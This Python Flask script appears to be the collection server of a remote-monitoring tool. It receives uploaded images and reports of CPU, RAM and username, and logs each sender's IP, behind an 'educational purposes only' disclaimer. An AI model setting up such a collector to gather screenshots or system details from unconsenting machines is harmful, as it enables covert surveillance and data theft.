from flask import Flask, request
import io
from PIL import Image
from datetime import date
from func import *
app = Flask(__name__)

app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024 *1204
@app.route('/')
def index():
    return 'This template is for educational purposes only.'

@app.route("/upload", methods=["POST"])
def getImage():
  try:
    ip = str(request.access_route[-1])
  except:
    ip = "unknown" 
  saveIP(ip=ip)
  saveImage(request=request)  
  return "O.K",200

@app.route("/data",methods=["GET"])
def s():
  cpu = request.args["cpu"]
  ram = request.args["ram"]
  usr = request.args["usr"]
  ip = str(request.access_route[-1])
  print(cpu,ram,usr)
  saveData(cpu=cpu,ram=ram,username=usr, ip=ip)
  return "O.K",200
  
app.run(host='0.0.0.0', port=81)
